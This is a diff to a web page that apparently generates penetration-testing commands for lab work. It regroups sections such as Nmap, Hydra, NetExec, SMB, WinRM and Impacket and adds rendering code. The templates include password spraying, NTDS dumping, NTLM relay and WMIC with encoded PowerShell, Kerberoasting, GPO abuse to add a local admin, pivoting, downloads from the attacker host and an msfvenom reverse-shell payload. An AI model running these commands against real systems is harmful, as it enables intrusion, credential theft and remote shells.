@@ -271,6 +271,18 @@
       padding: 5px 8px;
     }
 
+    .command-category-title {
+      margin: 26px 0 12px;
+      padding: 8px 0 6px;
+      color: var(--accent);
+      border-bottom: 1px solid var(--border);
+      font-size: 1.25rem;
+    }
+
+    .command-subsection {
+      margin-left: 18px;
+    }
+
     .command-line {
       display: flex;
       align-items: stretch;
@@ -386,6 +398,16 @@
       color: var(--accent);
     }
 
+    .edge-nav-group-title {
+      margin: 10px 0 4px;
+      padding: 5px 8px 2px;
+      color: var(--accent);
+      font-size: 0.82rem;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
     .edge-nav a {
       display: block;
       color: var(--text);
@@ -393,6 +415,11 @@
       padding: 6px 8px;
       border-radius: 6px;
       font-size: 0.92rem;
+    }
+
+    .edge-nav a.nav-child {
+      padding-left: 24px;
+      font-size: 0.9rem;
     }
 
     .edge-nav a:hover {
@@ -436,6 +463,10 @@
 
       .command-line button {
         width: fit-content;
+      }
+
+      .command-subsection {
+        margin-left: 0;
       }
 
       .edge-nav {
@@ -616,9 +647,10 @@ admin
         ]
       },
       {
-        id: "nmap",
+        id: "Nmap",
         title: "Nmap",
         nav: "Nmap",
+        group: "Enumeration",
         commands: [
           { prefix: "Most common 1000 ports", template: "sudo nmap -v -sV -sC -Pn -oA challenge/{last}/{last} {target}" },
           { prefix: "All ports", template: "sudo nmap -v -sV -sC -Pn -oA challenge/{last}/{last}_all {target} -p- -T4" },
@@ -626,35 +658,38 @@ admin
         ]
       },
       {
-        id: "gobuster",
-        title: "gobuster",
-        nav: "gobuster",
+        id: "Gobuster",
+        title: "Gobuster",
+        nav: "Gobuster",
+        group: "Enumeration",
         options: [
           { id: "gobusterPort", type: "checkbox", label: "Add :{port}" },
           { id: "gobusterProxy", type: "checkbox", label: "Add --proxy socks5://127.0.0.1:9999" }
         ],
         commands: [
-          { template: "gobuster dir -u http://{target}{gobusterPortFlag} -w /usr/share/wordlists/dirb/common.txt -o challenge/{last}/gobuster -x txt,pdf,config,conf,php,bak{gobusterProxyFlag}" }
+          { template: "gobuster dir -u http://{target}{gobusterPortFlag} -w /usr/share/wordlists/dirb/common.txt -o challenge/{last}/gobuster -x txt,pdf,config,conf,php,bak -b 400,403,404{gobusterProxyFlag}" }
         ]
       },
       {
-        id: "hydra",
+        id: "Hydra",
         title: "Hydra (SSH, RDP, FTP)",
-        nav: "hydra",
+        nav: "Hydra",
+        group: "Password Spray",
         options: [
           { id: "hydraPort", type: "checkbox", label: "Add -s {port}" }
         ],
         commands: [
-          { template: "hydra -t 1{hydraPortFlag} -L user.txt -P password.txt {service}://{target}" },
-          { template: "hydra -t 1{hydraPortFlag} -L user.txt -p '{password}' {service}://{target}" },
-          { template: "hydra -t 1{hydraPortFlag} -l '{user}' -P password.txt {service}://{target}" },
+          { template: "hydra -t 1{hydraPortFlag} -L users.txt -P passwords.txt {service}://{target}" },
+          { template: "hydra -t 1{hydraPortFlag} -L users.txt -p '{password}' {service}://{target}" },
+          { template: "hydra -t 1{hydraPortFlag} -l '{user}' -P passwords.txt {service}://{target}" },
           { template: "hydra -t 1{hydraPortFlag} -l '{user}' -p '{password}' {service}://{target}" }
         ]
       },
       {
         id: "nxc",
-        title: "NetExec (nxc) (-X 'powershell -e ' for command execution)",
+        title: "NetExec (nxc)",
         nav: "NetExec",
+        group: "Password Spray",
         options: [
           { id: "nxcAuthMode", type: "select", label: "Auth", choices: [
             { value: "password", label: "Password" },
@@ -665,104 +700,11 @@ admin
           { id: "nxcCommandExec", type: "checkbox", label: "Add -X 'powershell -e '" }
         ],
         commands: [
-          { template: "nxc {service} {target}{nxcPortFlag} -u user.txt{nxcCredFileFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
-          { template: "nxc {service} {target}{nxcPortFlag} -u user.txt{nxcCredSingleFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
+          { template: "nxc {service} {target}{nxcPortFlag} -u users.txt{nxcCredFileFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
+          { template: "nxc {service} {target}{nxcPortFlag} -u users.txt{nxcCredSingleFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
           { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredFileFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
           { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredSingleFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
-          { prefix: "SSH key file", template: "nxc ssh {target}{nxcPortFlag} -u user.txt --key-file id_ecdsa -p '{password}'{nxcLocalAuthFlag}" }
-        ]
-      },
-      {
-        id: "FTP",
-        title: "FTP",
-        nav: "FTP",
-        commands: [
-          { prefix: "Connect to server", template: "ftp {target} {port}" },
-          { prefix: "Credential login", template: "lftp -u '{user}','{password}' ftp://{target}:{port}" },
-          { prefix: "Anonymous login", template: "lftp -u anonymous,anonymous ftp://{target}:{port}" }
-        ]
-      },
-      {
-        id: "Smbclient",
-        title: "Smbclient",
-        nav: "Smbclient",
-        options: [
-          { id: "smbUseDomain", type: "checkbox", label: "Include domain", defaultChecked: true }
-        ],
-        commands: [
-          { prefix: "List SMB shares", template: "smbclient -L //{target} -U '{smbAuth}'" },
-          { prefix: "Connect to shares", template: "smbclient //{target} -U '{smbAuth}'" },
-          { prefix: "Execute command", template: "smbclient //{target}/<share_name> -c '<command>'" }
-        ]
-      },
-      {
-        id: "rdp",
-        title: "RDP",
-        nav: "RDP",
-        options: [
-          { id: "rdpDomain", type: "checkbox", label: "Add /d:{domain}" }
-        ],
-        commands: [
-          { template: "xfreerdp3 /cert:ignore /v:{target} /u:'{user}' /p:'{password}'{rdpDomainFlag} /drive:share,/home/kali/share" }
-        ]
-      },
-      {
-        id: "winrm",
-        title: "WinRM (5985 & 5986)",
-        nav: "WinRM",
-        commands: [
-          { template: "evil-winrm -i {target} -u '{user}' -p '{password}'" },
-          { template: "evil-winrm -i {target} -u '{user}' -p '{password}' -S -P 5986" },
-          { template: "evil-winrm -i {target} -u '{user}' -H '{hash}'" }
-        ]
-      },
-      {
-        id: "WinPEAS",
-        title: "WinPEAS",
-        nav: "WinPEAS",
-        commands: [
-          { prefix: "Look at env, autorun, scheduled tasks, listening ports", template: ".\\winPEASx64.exe | Tee-Object winpeas.txt" },
-          { prefix: "Convert to grep", template: "iconv -f UTF-16LE -t UTF-8 winpeas.txt > winpeas-utf8.txt" },
-          { prefix: "Convert to mousepad", template: "sed -r 's/\\x1b\\[[0-9;]*m//g' winpeas-utf8.txt > wp-clean.txt" }
-        ]
-      },
-      {
-        id: "LinPEAS",
-        title: "LinPEAS",
-        nav: "LinPEAS",
-        commands: [
-          { prefix: "Look at env, autorun, scheduled tasks, listening ports", template: "./linpeas.sh 2>&1 | tee linpeas.txt" }
-        ]
-      },
-      {
-        id: "printspoofer",
-        title: "PrintSpoofer64 (SeImpersonatePrivilege)",
-        nav: "PrintSpoofer64",
-        commands: [
-          { template: ".\\PrintSpoofer64.exe -i -c cmd" }
-        ]
-      },
-      {
-        id: "potato",
-        title: "Potato (SeImpersonatePrivilege)",
-        nav: "Potato",
-        commands: [
-          { template: ".\\SharpEfsPotato.exe -p {filename}" }
-        ]
-      },
-      {
-        id: "ligolo",
-        title: "Ligolo",
-        nav: "Ligolo",
-        commands: [
-          { prefix: "On Kali", className: "kali", template: "sudo ip tuntap add user kali mode tun ligolo" },
-          { prefix: "", className: "kali", template: "sudo ip link set ligolo up" },
-          { prefix: "", className: "kali", template: "./ligolo-proxy -selfcert -laddr 0.0.0.0:11601" },
-          { prefix: "On target", className: "target", template: ".\\ligolo-agent -connect {kaliIp}:11601 -ignore-cert" },
-          { prefix: "On Kali", className: "kali", template: "session" },
-          { prefix: "", className: "kali", template: "ifconfig" },
-          { prefix: "", className: "kali", template: "sudo ip route add {targetNet} dev ligolo" },
-          { prefix: "", className: "kali", template: "start" }
+          { prefix: "SSH key file", template: "nxc ssh {target}{nxcPortFlag} -u users.txt --key-file id_ecdsa -p '{password}'{nxcLocalAuthFlag}" }
         ]
       },
       {
@@ -771,9 +713,10 @@ admin
         nav: "Password cracking",
         options: [
           { id: "hashcatModule", type: "select", label: "Hashcat mode", choices: [
-            { value: "1000", label: "1000" },
-            { value: "13400", label: "13400" },
-            { value: "22921", label: "22921" }
+            { value: "1000", label: "NTLM 1000" },
+            { value: "13400", label: "KeePass 13400" },
+            { value: "22921", label: "SSH 22921" },
+            { value: "18200 ", label: "AS-REP 18200 " }
           ] }
         ],
         commands: [
@@ -787,21 +730,123 @@ admin
         ]
       },
       {
-        id: "impacket",
-        title: "Impacket",
-        nav: "Impacket",
+        id: "SSH",
+        title: "SSH",
+        nav: "SSH",
+        group: "Protocols",
         commands: [
-          { prefix: "Local admin & ADMIN$", template: "impacket-psexec -hashes :{hash} {domainShort}/{user}@{target}" },
-          { prefix: "", template: "impacket-wmiexec -hashes :{hash} {domainShort}/{user}@{target}" },
-          { template: "impacket-secretsdump -just-dc {domain}/{user}:'{password}'@{target}" },
-          { template: "impacket-secretsdump -hashes :{hash} {domain}/{user}@{target}" },
-          { prefix: "SMB NTLM relay", template: "impacket-ntlmrelayx --no-http-server -smb2support -t {target} -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"" }
+          { template: "ssh {user}@{target}" },
+          { template: "ssh -i id_ecdsa -p {port} {user}@{target}" }
+        ]
+      },
+      {
+        id: "FTP",
+        title: "FTP",
+        nav: "FTP",
+        group: "Protocols",
+        commands: [
+          { prefix: "Connect to server", template: "ftp {target} {port}" },
+          { prefix: "Credential login", template: "lftp -u '{user}','{password}' ftp://{target}:{port}" },
+          { prefix: "Anonymous login", template: "lftp -u anonymous,anonymous ftp://{target}:{port}" }
+        ]
+      },
+      {
+        id: "Smbclient",
+        title: "Smbclient",
+        nav: "Smbclient",
+        group: "Protocols",
+        options: [
+          { id: "smbUseDomain", type: "checkbox", label: "Include domain", defaultChecked: true },
+          { id: "smbShare", type: "select", label: "Share", choices: [
+            { value: "ADMIN$", label: "ADMIN$" },
+            { value: "C$", label: "C$" },
+            { value: "SYSVOL", label: "SYSVOL" }
+          ] }
+        ],
+        commands: [
+          { prefix: "List SMB shares", template: "smbclient -L //{target} -U '{smbAuth}'" },
+          { prefix: "Connect to shares", template: "smbclient //{target}/{smbShare} -U '{smbAuth}'" },
+          { prefix: "Execute command", template: "smbclient //{target}/{smbShare} -c '<command>'" },
+          { prefix: "Mount share", template: "sudo mount -t cifs //{target}/{smbShare} /home/kali/challenge/mount -o username={user},password='{password}',domain={domainShort},uid=$(id -u),gid=$(id -g),file_mode=0644,dir_mode=0755" }
+        ]
+      },
+      {
+        id: "rdp",
+        title: "RDP",
+        nav: "RDP",
+        group: "Protocols",
+        options: [
+          { id: "rdpDomain", type: "checkbox", label: "Add /d:{domain}" }
+        ],
+        commands: [
+          { template: "xfreerdp3 /cert:ignore /v:{target} /u:'{user}' /p:'{password}'{rdpDomainFlag} /drive:share,/home/kali/share" }
+        ]
+      },
+      {
+        id: "winrm",
+        title: "WinRM (5985 & 5986)",
+        nav: "WinRM",
+        group: "Protocols",
+        commands: [
+          { template: "evil-winrm -i {target} -u '{user}' -p '{password}'" },
+          { template: "evil-winrm -i {target} -u '{user}' -p '{password}' -S -P 5986" },
+          { template: "evil-winrm -i {target} -u '{user}' -H '{hash}'" }
+        ]
+      },
+      {
+        id: "wmic",
+        title: "WMIC (port 135 and local admin on target)",
+        nav: "WMIC",
+        group: "Protocols",
+        commands: [
+          { prefix: "Windows", className: "target", template: "wmic /node:{target} /user:{user} /password:'{password}' process call create \"powershell -nop -w hidden -e JABjAGwAaQ......gBOAGUAdAA\"" }
+        ]
+      },
+      {
+        id: "WinPEAS",
+        title: "WinPEAS",
+        nav: "WinPEAS",
+        group: "Privilege escalation",
+        commands: [
+          { prefix: "Look at env, autorun, scheduled tasks, listening ports", template: ".\\winPEASx64.exe | Tee-Object winpeas.txt" },
+          { prefix: "Convert to grep", template: "iconv -f UTF-16LE -t UTF-8 winpeas.txt > winpeas-utf8.txt" },
+          { prefix: "Convert to mousepad", template: "sed -r 's/\\x1b\\[[0-9;]*m//g' winpeas-utf8.txt > wp-clean.txt" }
+        ]
+      },
+      {
+        id: "LinPEAS",
+        title: "LinPEAS",
+        nav: "LinPEAS",
+        group: "Privilege escalation",
+        commands: [
+          { prefix: "Look at env, autorun, scheduled tasks, listening ports", template: "./linpeas.sh 2>&1 | tee linpeas.txt" }
+        ]
+      },
+      {
+        id: "SeImpersonatePrivilege",
+        title: "SeImpersonatePrivilege",
+        nav: "SeImpersonatePrivilege",
+        group: "Privilege escalation",
+        commands: [
+          { prefix: "PrintSpoofer64", template: ".\\PrintSpoofer64.exe -i -c cmd" },
+          { prefix: "Potato", template: ".\\SharpEfsPotato.exe -p {filename}" }
+        ]
+      },
+      {
+        id: "sharpgpoabuse",
+        title: "SharpGPOAbuse",
+        nav: "SharpGPOAbuse",
+        group: "Privilege escalation",
+        commands: [
+          { template: "./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {user} --GPOName \"Default Domain Policy\"" },
+          { template: "gpupdate /force" }
         ]
       },
       {
         id: "windows-enum-local",
         title: "Windows enumeration - Local",
         nav: "Windows enumeration - Local",
+        group: "Windows enumeration",
         commands: [
           { template: "hostname" },
           { template: "systeminfo" },
@@ -812,54 +857,80 @@ admin
           { prefix: "User's group membership", template: "net user {user}" },
           { prefix: "List local groups", template: "net localgroup" },
           { prefix: "Local group's members", template: "net localgroup administrators" },
-          { prefix: "Password policy", template: "net accounts" }
+          { prefix: "Password policy", template: "net accounts" },
+          { prefix: "Query AD and locate DC", template: "nltest /dsgetdc:{domain}" },
+          { prefix: "Permission", template: "icacls <path>" },
+          { prefix: "Scheduled task", template: "schtasks /query /fo LIST /v" },
+          { prefix: "Process", template: "Get-CimInstance Win32_Process |  Select Name, ProcessId, ParentProcessId, ExecutablePath, CommandLine" },
+          { prefix: "Service", template: "Get-CimInstance Win32_Service | Select Name, State, StartMode, StartName, ProcessId, PathName" }
         ]
       },
       {
         id: "windows-enum-domain",
         title: "Windows enumeration - Domain",
         nav: "Windows enumeration - Domain",
+        group: "Windows enumeration",
         commands: [
           { prefix: "List domain users", template: "net user /domain" },
           { prefix: "Domain user's group membership", template: "net user {user} /domain" },
           { prefix: "List domain groups", template: "net group /domain" },
           { prefix: "Domain group's members", template: "net group \"Domain Admins\" /domain" },
-          { prefix: "Domain password policy", template: "net accounts /domain" }
+          { prefix: "Domain password policy", template: "net accounts /domain" },
         ]
       },
       {
-        id: "sharpgpoabuse",
-        title: "SharpGPOAbuse",
-        nav: "SharpGPOAbuse",
+        id: "ligolo",
+        title: "Ligolo",
+        nav: "Ligolo",
         commands: [
-          { template: "./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {user} --GPOName \"Default Domain Policy\"" },
-          { template: "gpupdate /force" }
+          { prefix: "On Kali", className: "kali", template: "sudo ip tuntap add user kali mode tun ligolo" },
+          { prefix: "", className: "kali", template: "sudo ip link set ligolo up" },
+          { prefix: "", className: "kali", template: "sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601" },
+          { prefix: "On target", className: "target", template: ".\\ligolo-agent -connect {kaliIp}:11601 -ignore-cert" },
+          { prefix: "On Kali", className: "kali", template: "session" },
+          { prefix: "", className: "kali", template: "ifconfig" },
+          { prefix: "", className: "kali", template: "sudo ip route add {targetNet} dev ligolo" },
+          { prefix: "", className: "kali", template: "start" }
         ]
       },
       {
-        id: "wmic",
-        title: "WMIC (port 135 and local admin on target)",
-        nav: "WMIC",
+        id: "impacket",
+        title: "Impacket",
+        nav: "Impacket",
+        options: [
+          { id: "impacketAuthMode", type: "select", label: "Auth", choices: [
+            { value: "password", label: "Password" },
+            { value: "hash", label: "Hash" }
+          ] }
+        ],
         commands: [
-          { prefix: "Windows", className: "target", template: "wmic /node:{target} /user:{user} /password:'{password}' process call create \"powershell -nop -w hidden -e JABjAGwAaQ......gBOAGUAdAA\"" }
+          { prefix: "Local admin & ADMIN$", template: "impacket-psexec{impacketHashFlag} {domainShort}/{user}{impacketPwFlag}@{target}" },
+          { prefix: "", template: "impacket-wmiexec  {domainShort}/{user}@{target}" },
+          { prefix: "Dump NTDS", template: "impacket-secretsdump -just-dc{impacketHashFlag} {domain}/{user}{impacketPwFlag}@{target}" },
+          { prefix: "Dump everything", template: "impacket-secretsdump{impacketHashFlag} {domain}/{user}{impacketPwFlag}@{target}" },
+          { prefix: "SMB NTLM relay", template: "impacket-ntlmrelayx --no-http-server -smb2support -t {target} -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"" },
+          { prefix: "AS-REP Roast", template: "impacket-GetNPUsers -dc-ip {target} -request -outputfile hashes.asreproast {domain}/{user}" },
+          { prefix: "Kerberoast", template: "impacket-GetUserSPNs -dc-ip {target} -request -outputfile hashes.kerberoast {domain}/{user}" }
         ]
       },
       {
         id: "bloodhound",
-        title: "Bloodhound (/etc/bhapi/bhapi.json)",
+        title: "Bloodhound via domain user (/etc/bhapi/bhapi.json)",
         nav: "Bloodhound",
         commands: [
-          { prefix: "On Kali", className: "kali", template: "bloodhound-python -u '{user}' -p '{password}' -d {domain} -ns {target} -c All" },
-          { prefix: "", className: "kali", template: "bloodhound-ce-python -u '{user}' -p '{password}' -d {domain} -ns {target} -c All" },
+          { prefix: "On Kali > dns server", className: "kali", template: "bloodhound-ce-python -u '{user}' -p '{password}' -d {domain} -ns {target} -c All" },
+          { prefix: "", className: "kali", template: "bloodhound-python -u '{user}' -p '{password}' -d {domain} -ns {target} -c All" },
           { prefix: "On target", className: "target", template: "powershell -ep bypass" },
-          { prefix: "", className: "target", template: "Import-Module .\\Sharphound.ps1" },
-          { prefix: "", className: "target", template: ". .\\Sharphound.ps1" },
+          { prefix: "Either", className: "target", template: ". .\\Sharphound.ps1" },
+          { prefix: "Or", className: "target", template: "Import-Module .\\Sharphound.ps1" },
           { prefix: "", className: "target", template: "Invoke-BloodHound -CollectionMethod All -OutputDirectory ." },
+          { prefix: "On Kali", className: "kali", template: "bloodhound-start" },
           { prefix: "Pre-built queries", template: "All Domain Admins" },
           { prefix: "", template: "Shortest Paths to Domain Admins" },
           { prefix: "", template: "Shortest paths from Owned objects" },
           { prefix: "", template: "where Domain Users can RDP" },
           { prefix: "", template: "Computers where Domain Users are Local administrators" },
+          { prefix: "", template: "AS-REP Roastable users" },
           { prefix: "", template: "All Kerberoastable user" }
         ]
       },
@@ -893,15 +964,21 @@ admin
           { prefix: "Linux", template: "wget http://{kaliIp}/{filename}" },
           { prefix: "Linux/PowerShell", template: "curl http://{kaliIp}/{filename} -o {filename}" },
           { prefix: "PowerShell", template: "iwr -uri http://{kaliIp}/{filename} -OutFile {filename}" },
-          { prefix: "CMD", template: "certutil -urlcache -f http://{kaliIp}/{filename} {filename}" }
+          { prefix: "CMD", template: "certutil -urlcache -split -f http://{kaliIp}/{filename} {filename}" }
         ]
       },
       {
         id: "msfvenom",
         title: "msfvenom",
         nav: "msfvenom",
+        options: [
+          { id: "msfvenomFileType", type: "select", label: "File type", choices: [
+            { value: "exe", label: "exe" },
+            { value: "dll", label: "dll" }
+          ] }
+        ],
         commands: [
-          { template: "msfvenom -p windows/x64/shell_reverse_tcp LPORT={lport} LHOST={kaliIp} -f exe -o shell.exe" }
+          { template: "msfvenom -p windows/x64/shell_reverse_tcp LPORT={lport} LHOST={kaliIp} -f {msfvenomFileType} -o shell.{msfvenomFileType}" }
         ]
       },
       {
@@ -1028,15 +1105,44 @@ admin
 
     function renderNavigation() {
       const nav = document.getElementById("edgeNavLinks");
-      nav.innerHTML = COMMAND_SECTIONS
-        .map(section => `<a href="#${section.id}">${escapeHtml(section.nav || section.title)}</a>`)
-        .join("");
+      let lastGroup = null;
+
+      nav.innerHTML = COMMAND_SECTIONS.map(section => {
+        const group = section.group || "";
+        const label = escapeHtml(section.nav || section.title);
+        const linkClass = group ? "nav-child" : "";
+        const link = `<a class="${linkClass}" href="#${section.id}">${label}</a>`;
+
+        if (group && group !== lastGroup) {
+          lastGroup = group;
+          return `<div class="edge-nav-group-title">${escapeHtml(group)}</div>${link}`;
+        }
+
+        if (!group) {
+          lastGroup = null;
+        }
+
+        return link;
+      }).join("");
     }
 
     function renderCommandSections() {
       const container = document.getElementById("commandsContainer");
+      let lastGroup = null;
+
       const html = COMMAND_SECTIONS.map((section, sectionIndex) => {
         const options = renderSectionOptions(section);
+        const group = section.group || "";
+        const groupHeading = group && group !== lastGroup
+          ? `<h2 class="command-category-title">${escapeHtml(group)}</h2>`
+          : "";
+        const cardClass = group ? "command-group command-subsection" : "command-group";
+
+        if (group) {
+          lastGroup = group;
+        } else {
+          lastGroup = null;
+        }
 
         const lines = section.commands.map((command, commandIndex) => {
           const commandId = commandIdFor(sectionIndex, commandIndex);
@@ -1053,7 +1159,8 @@ admin
         }).join("");
 
         return `
-          <div class="command-group" id="${section.id}">
+          ${groupHeading}
+          <div class="${cardClass}" id="${section.id}">
             <h3>${escapeHtml(section.title)}</h3>
             ${options}
             ${lines}
@@ -1175,20 +1282,25 @@ admin
       };
 
       const nxcAuthMode = optionValue("nxcAuthMode", "password");
+      const impacketAuthMode = optionValue("impacketAuthMode", "password");
 
       values.hydraPortFlag = optionChecked("hydraPort") ? ` -s ${values.port}` : "";
       values.rdpDomainFlag = optionChecked("rdpDomain") ? ` /d:${values.domain}` : "";
       values.nxcPortFlag = optionChecked("nxcPort") ? ` --port ${values.port}` : "";
       values.nxcLocalAuthFlag = optionChecked("nxcLocalAuth") ? " --local-auth" : "";
       values.nxcCommandExecFlag = optionChecked("nxcCommandExec") ? " -X 'powershell -e '" : "";
-      values.nxcCredFileFlag = nxcAuthMode === "hash" ? " -H hashes.txt" : " -p password.txt";
+      values.nxcCredFileFlag = nxcAuthMode === "hash" ? " -H hashes.txt" : " -p passwords.txt";
       values.nxcCredSingleFlag = nxcAuthMode === "hash" ? ` -H '${values.hash}'` : ` -p '${values.password}'`;
+      values.impacketHashFlag = impacketAuthMode === "hash" ? ` -hashes :${values.hash}` : "";
+      values.impacketPwFlag = impacketAuthMode === "hash" ? "" : `:'${values.password}'`;
       values.smbAuth = optionChecked("smbUseDomain")
         ? `${values.domainShort}\\${values.user}%${values.password}`
         : `${values.user}%${values.password}`;
       values.gobusterPortFlag = optionChecked("gobusterPort") ? `:${values.port}` : "";
       values.gobusterProxyFlag = optionChecked("gobusterProxy") ? " --proxy socks5://127.0.0.1:9999" : "";
       values.hashcatModule = optionValue("hashcatModule", "1000");
+      values.smbShare = optionValue("smbShare", "SYSVOL");
+      values.msfvenomFileType = optionValue("msfvenomFileType", "exe");
 
       return values;
     }
